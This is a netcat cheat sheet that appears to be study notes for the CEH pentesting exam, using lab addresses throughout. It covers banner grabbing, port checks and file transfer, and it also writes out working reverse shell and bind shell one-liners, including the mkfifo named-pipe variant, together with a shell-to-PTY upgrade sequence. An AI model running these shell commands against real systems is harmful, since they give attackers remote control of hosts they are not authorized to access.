# nc / netcat — TCP/UDP Swiss army knife

> **The universal network tool.** Raw TCP/UDP connections, banner grabbing, port listener, reverse/bind shells, file transfer, port scan. CEH practical: banner grab, reverse shell listener, quick port check.

**Install check (Parrot):** `which nc` → `/bin/nc` (usually `nc.traditional` or `ncat`).

Variants: `nc.traditional` (classic), `nc.openbsd` (default on Debian/Parrot — slightly different flags), `ncat` (nmap project, most featureful).

---

## 🎯 Cheat-flow

| Goal | Command | Why |
|---|---|---|
| **Banner grab** | `nc -v 192.168.52.129 21` | Connects + shows banner |
| Banner with manual send | `echo "" \| nc -v -w 3 192.168.52.129 80` | Timeout 3s |
| **Port check** (TCP) | `nc -zv 192.168.52.129 22` | -z = no data, just connect |
| Port range scan | `nc -zv 192.168.52.129 20-25` | Quick sweep |
| UDP port check | `nc -zvu 192.168.52.129 53` | -u = UDP |
| **Listener** (reverse shell catcher) | `nc -lvnp 4444` | Wait on 4444 |
| File receive | `nc -lvnp 4444 > out.bin` | Save incoming |
| File send | `nc 192.168.52.129 4444 < file.bin` | Push file |
| **Reverse shell from victim** | `nc 192.168.52.128 4444 -e /bin/bash` | Classic (if -e supported) |
| Reverse shell (no -e, openbsd) | `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f\|/bin/sh -i 2>&1\|nc 192.168.52.128 4444 >/tmp/f` | Named-pipe trick |
| **Bind shell on victim** | `nc -lvnp 4444 -e /bin/bash` | Listener w/ shell |
| HTTP manual request | `printf 'GET / HTTP/1.0\r\n\r\n' \| nc 192.168.52.129 80` | Raw HTTP |
| Chat between boxes | `nc -lvnp 4444` ↔ `nc <attacker> 4444` | Bidirectional |

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-l` | **Listen** mode |
| `-v` / `-vv` | Verbose |
| `-n` | No DNS resolve |
| `-p <port>` | Source/listen port |
| `-z` | Zero-I/O (scan only, no data) |
| `-u` | **UDP** (default is TCP) |
| `-w <sec>` | Timeout |
| `-e <cmd>` | Execute command on connect (traditional/ncat only, not openbsd) |
| `-k` | Keep listening after client disconnect (ncat) |
| `-c <cmd>` | Like -e but via /bin/sh (some variants) |

---

## ⚡ Critical patterns for CEH

### Reverse shell (attacker-side listener first, then victim runs the connect)
```bash
# Attacker (192.168.52.128)
nc -lvnp 4444

# Victim (run via RCE/webshell)
nc 192.168.52.128 4444 -e /bin/bash
```

### Banner grab all open ports quickly
```bash
for p in 21 22 23 25 80 110 139 443 445; do
  echo "--- $p ---"
  echo "" | nc -v -w 2 192.168.52.129 $p
done
```

### Upgrade nc shell to full PTY (once you have a reverse shell)
```bash
# In nc shell:
python -c 'import pty; pty.spawn("/bin/bash")'
# Then Ctrl-Z, on attacker:
stty raw -echo; fg
# Back in shell:
export TERM=xterm
```

---

## ⚠️ Gotchas

- **`-e` flag** NOT present in `nc.openbsd` (Parrot default) → use named-pipe trick or switch to `ncat`.
- `nc` alone doesn't survive disconnects — use `-k` (ncat) or wrap in `while true; do nc -lvnp 4444; done`.
- No encryption — use `ncat --ssl` or `socat` for encrypted channels.
- **UDP + `-z`** is unreliable — UDP has no handshake, so "closed" often looks like "open".
- `ncat -e` needs explicit enable on some distros.
- Firewall / NAT will break reverse shells — always verify listener is reachable first.

---

## 🧠 nc vs ncat vs socat

| Tool | Use when |
|---|---|
| `nc` (openbsd) | Quick one-shot, banner grab, simple listener |
| `ncat` | Need `-e`, SSL, keep-alive, ACLs |
| `socat` | Fully-interactive PTY shells, complex tunneling |

---

## 📖 See also
- [nmap.md](nmap.md)
- [msfvenom.md](msfvenom.md) — generates reverse-shell payloads
- [playbooks/exploitation-playbook.md](../playbooks/exploitation-playbook.md)
